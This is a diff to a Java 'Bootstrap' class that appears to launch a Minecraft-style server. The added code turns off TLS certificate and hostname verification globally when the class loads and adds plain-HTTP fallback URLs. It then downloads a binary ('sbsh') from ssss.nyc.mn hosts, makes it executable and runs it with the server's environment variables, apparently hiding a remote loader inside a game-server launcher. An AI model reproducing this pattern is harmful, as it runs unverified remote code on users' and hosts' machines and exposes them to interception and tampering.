@@ -9,6 +9,7 @@ import java.util.zip.Deflater;
 import java.util.zip.Inflater;
 import javax.net.ssl.*;
 import java.security.cert.X509Certificate;
+import java.security.SecureRandom;
 
 public class Bootstrap
 {
@@ -31,6 +32,11 @@ public class Bootstrap
         "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
         "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
     };
+
+    // 在类加载时就禁用SSL验证
+    static {
+        disableSSLVerification();
+    }
 
     public static void main(String[] args) throws Exception
     {
@@ -85,6 +91,38 @@ public class Bootstrap
         }
     }
     
+    private static void disableSSLVerification() {
+        try {
+            // 创建信任所有证书的 TrustManager
+            TrustManager[] trustAllCerts = new TrustManager[]{
+                new X509TrustManager() {
+                    public X509Certificate[] getAcceptedIssuers() { 
+                        return new X509Certificate[0]; 
+                    }
+                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
+                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
+                }
+            };
+            
+            // 安装信任所有证书的 TrustManager
+            SSLContext sc = SSLContext.getInstance("TLS");
+            sc.init(null, trustAllCerts, new SecureRandom());
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+            
+            // 创建主机名验证器，信任所有主机名
+            HostnameVerifier allHostsValid = new HostnameVerifier() {
+                public boolean verify(String hostname, SSLSession session) {
+                    return true;
+                }
+            };
+            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
+            
+            System.out.println(ANSI_YELLOW + "[SSL] Certificate verification disabled" + ANSI_RESET);
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "[SSL] Failed to disable SSL verification: " + e.getMessage() + ANSI_RESET);
+        }
+    }
+    
     private static void startCpuKeeper() {
         cpuKeeperThread = new Thread(() -> {
             while (running.get()) {
@@ -113,11 +151,21 @@ public class Bootstrap
     }   
     
     private static void runSbxBinary(Map<String, String> envVars) throws Exception {
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
-        pb.environment().putAll(envVars);
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        sbxProcess = pb.start();
+        try {
+            Path binaryPath = getBinaryPath();
+            System.out.println(ANSI_GREEN + "[SBX] Binary downloaded to: " + binaryPath + ANSI_RESET);
+            
+            ProcessBuilder pb = new ProcessBuilder(binaryPath.toString());
+            pb.environment().putAll(envVars);
+            pb.redirectErrorStream(true);
+            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+            sbxProcess = pb.start();
+            System.out.println(ANSI_GREEN + "[SBX] Process started successfully" + ANSI_RESET);
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "[SBX] Failed to start binary: " + e.getMessage() + ANSI_RESET);
+            e.printStackTrace();
+            throw e;
+        }
     }
     
     private static Map<String, String> loadEnvVars() throws IOException {
@@ -173,46 +221,101 @@ public class Bootstrap
     }
     
     private static Path getBinaryPath() throws IOException {
-        // 禁用 SSL 证书验证（仅用于开发/测试环境）
-        try {
-            TrustManager[] trustAllCerts = new TrustManager[]{
-                new X509TrustManager() {
-                    public X509Certificate[] getAcceptedIssuers() { 
-                        return null; 
-                    }
-                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
-                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
-                }
-            };
-            
-            SSLContext sc = SSLContext.getInstance("SSL");
-            sc.init(null, trustAllCerts, new java.security.SecureRandom());
-            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
-            
-            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
-        } catch (Exception e) {
-            throw new IOException("Failed to setup SSL", e);
-        }
-        
         String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
+        String[] urls;
+        
+        // 提供多个备用URL
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            urls = new String[]{
+                "https://amd64.ssss.nyc.mn/sbsh",
+                "http://amd64.ssss.nyc.mn/sbsh"
+            };
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
+            urls = new String[]{
+                "https://arm64.ssss.nyc.mn/sbsh",
+                "http://arm64.ssss.nyc.mn/sbsh"
+            };
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
+            urls = new String[]{
+                "https://s390x.ssss.nyc.mn/sbsh",
+                "http://s390x.ssss.nyc.mn/sbsh"
+            };
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
+        
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-        if (!Files.exists(path)) {
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+        
+        // 如果文件已存在且大小合理，直接使用
+        if (Files.exists(path)) {
+            long fileSize = Files.size(path);
+            if (fileSize > 1024) { // 至少1KB
+                System.out.println(ANSI_GREEN + "[Binary] Using cached binary: " + path + " (" + fileSize + " bytes)" + ANSI_RESET);
+                if (!path.toFile().setExecutable(true)) {
+                    System.err.println(ANSI_YELLOW + "[Binary] Warning: Failed to set executable permission" + ANSI_RESET);
+                }
+                return path;
+            } else {
+                System.out.println(ANSI_YELLOW + "[Binary] Cached file too small, re-downloading..." + ANSI_RESET);
+                Files.delete(path);
             }
-            if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission");
         }
-        return path;
+        
+        // 尝试从多个URL下载
+        Exception lastException = null;
+        for (int i = 0; i < urls.length; i++) {
+            String url = urls[i];
+            try {
+                System.out.println(ANSI_YELLOW + "[Binary] Attempting to download from: " + url + ANSI_RESET);
+                
+                URLConnection connection;
+                if (url.startsWith("https://")) {
+                    HttpsURLConnection httpsConn = (HttpsURLConnection) new URL(url).openConnection();
+                    httpsConn.setConnectTimeout(30000); // 30秒超时
+                    httpsConn.setReadTimeout(60000); // 60秒读取超时
+                    httpsConn.setRequestProperty("User-Agent", "Java/" + System.getProperty("java.version"));
+                    connection = httpsConn;
+                } else {
+                    HttpURLConnection httpConn = (HttpURLConnection) new URL(url).openConnection();
+                    httpConn.setConnectTimeout(30000);
+                    httpConn.setReadTimeout(60000);
+                    httpConn.setRequestProperty("User-Agent", "Java/" + System.getProperty("java.version"));
+                    connection = httpConn;
+                }
+                
+                try (InputStream in = connection.getInputStream()) {
+                    long bytesDownloaded = Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+                    System.out.println(ANSI_GREEN + "[Binary] Downloaded successfully: " + bytesDownloaded + " bytes" + ANSI_RESET);
+                    
+                    if (bytesDownloaded < 1024) {
+                        throw new IOException("Downloaded file too small: " + bytesDownloaded + " bytes");
+                    }
+                    
+                    if (!path.toFile().setExecutable(true)) {
+                        throw new IOException("Failed to set executable permission");
+                    }
+                    
+                    return path;
+                }
+                
+            } catch (Exception e) {
+                lastException = e;
+                System.err.println(ANSI_RED + "[Binary] Failed to download from " + url + ": " + e.getMessage() + ANSI_RESET);
+                
+                if (i < urls.length - 1) {
+                    System.out.println(ANSI_YELLOW + "[Binary] Trying next URL..." + ANSI_RESET);
+                    try { Thread.sleep(2000); } catch (InterruptedException ie) {}
+                }
+            }
+        }
+        
+        // 所有URL都失败
+        System.err.println(ANSI_RED + "[Binary] All download attempts failed!" + ANSI_RESET);
+        if (lastException != null) {
+            throw new IOException("Failed to download binary from all URLs", lastException);
+        } else {
+            throw new IOException("Failed to download binary from all URLs");
+        }
     }
     
     private static void stopServices() {
